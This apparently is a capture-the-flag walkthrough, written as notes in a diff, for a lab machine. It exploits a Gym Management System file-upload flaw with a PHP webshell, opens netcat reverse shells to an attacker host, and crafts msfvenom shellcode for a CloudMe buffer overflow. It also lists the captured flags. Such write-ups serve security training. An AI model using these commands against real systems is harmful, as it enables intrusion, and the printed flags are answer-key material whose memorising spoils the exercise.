@@ -1,0 +1,119 @@
+nmap -sC -sV -oN nmap 10.10.10.198 -v -A
+
+-> port 8080 open
+http://10.10.10.198:8080
+
+in package page: `mrb3n's Bro Hut- Packages`
+-> mrb3n must be the user
+
+in contact page -> gym management software
+
+Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py
+
+cp /usr/share/exploitdb/exploits/php/webapps/48506.py .
+rename it to exploit.py
+
+explanations in https://www.exploit-db.com/exploits/48506
+```
+# Exploit Details:
+#   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
+#   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
+#     - `upload.php?id=kamehameha`
+#     /upload.php:
+#        4 $user = $_GET['id'];
+#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
+#       35       "upload/". $user.".".$ext);
+#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
+#     /upload.php:
+#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
+#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
+#       14 && in_array($extension, $allowedExts))
+#   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
+#        7 if(isset($_POST['pupload'])){
+#        8 if ((($_FILES["file"]["type"] == "image/gif")
+#       11 || ($_FILES["file"]["type"] == "image/png")
+#   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
+#       <?php echo shell_exec($_GET["telepathy"]); ?>
+#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
+#       30           $pic=$_FILES["file"]["name"];
+#       31             $conv=explode(".",$pic);
+#       32             $ext=$conv['1'];
+#   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png';
+#   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
+```
+
+python2 exploit.py http://10.10.10.198:8080/
+-> successfully opens a webshell
+
+now i need to have a real shell as shaun to navigate easily
+dl nc.exe from https://github.com/int0x33/nc.exe
+then start a server with python -m SimpleHTTPServer 4444
+and dl it on target with curl -O http://10.10.14.4:4444/nc.exe
+
+set up listener on 4444 and nc.exe 10.10.14.4 4444 -e cmd.exe from webshell
+-> shell as buff/shaun
+
+user flag in C:\Users\shaun\Desktop
+3d3b855d6ebf98baf469e5a26ccff8e8
+
+lets become administrator now
+
+in C:\xampp -> passwords.txt
+idk how to use these -> lets search in shaun files before investigating those lines
+-> CloudMe_1112.exe in C:\Users\shaun\Downloads
+
+known exploit:
+CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py
+
+rename 48389.py to cloudme_exploit.py and change the shellcode with
+`msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.15 1234 -e cmd.exe' -b '\x00\x0A\x0D' -f python`
+upload it to target, for example using curl: `curl -O http://10.10.14.15:5555/cloudme_exploit.py`
+
+but problem: python is not installed on the target
+lets compile the .py into a .exe so i can execute it from target with pyinstaller
+
+from windows machine:
+`pyinstaller cloudme_exploit.py --onefile --name cloudme_exploit.exe`
+
+-> exploit still do not work because host has to be seen as 127.0.0.1 by target
+lets use plink to do some portforwarding on the machine
+
+first download 64 bit plink.exe and upload it to target
+then follow https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d
+
+on host:
+sudo service ssh start
+
+then on target
+plink.exe -ssh -l kali -pw kali -R 10.10.14.15:8888:127.0.0.1:8888 10.10.14.15
+
+on host:
+nc -lvnp 1234
+
+on an other terminal:
+`C:\Users\shaun\Downloads\CloudMe_1112.exe`
+`C:\xampp\htdocs\gym\upload\cloudme_exploit.exe`
+
+--> error
+
+```
+C:\xampp\htdocs\gym\upload>C:\xampp\htdocs\gym\upload\cloudme_exploit.exe
+C:\xampp\htdocs\gym\upload\cloudme_exploit.exe
+Traceback (most recent call last):
+  File "cloudme_exploit.py", line 50, in <module>
+ConnectionRefusedError: [WinError 10061] No connection could be made because the target machine actively refused it
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "cloudme_exploit.py", line 53, in <module>
+AttributeError: module 'sys' has no attribute 'exc_value'
+[7764] Failed to execute script cloudme_exploit
+```
+
+just lauch it again but still does not work even without errors bc the listener should be set as kali and not as root
+
+su kali -> nc -lvnp 1234 and start exploit again
+
+root flag
+0ce38ab812e1fb6e9845290c2db27af6
